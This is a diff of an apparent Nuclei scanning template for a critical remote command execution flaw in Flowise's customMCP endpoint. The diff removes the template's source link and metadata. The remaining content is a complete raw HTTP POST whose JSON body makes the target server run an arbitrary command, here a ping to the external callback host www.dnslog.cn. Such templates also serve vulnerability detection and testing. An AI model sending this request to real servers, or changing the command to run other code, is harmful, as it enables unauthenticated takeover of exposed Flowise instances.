@@ -3,12 +3,8 @@ info:
   name: Flowise customMCP存在远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sx7xg2ppgxdzgkqy'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: sx7xg2ppgxdzgkqy
-    fofa: title="Flowise"
 http:
 - raw:
   - "POST /api/v1/node-load-method/customMCP HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Kubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36\nConnection: close\nContent-Length: 279\nContent-Type: application/json\nx-request-from: internal\nAccept-Encoding: gzip\n\n{\n    \"inputs\": {\n        \"mcpServerConfig\": {\n            \"command\": \"ping\",\n            \"args\": [\n                \"www.dnslog.cn\",\n                \"-c\",\n                \"4\"\n            ]\n        }\n    },\n    \"loadMethod\": \"listActions\"\n}"
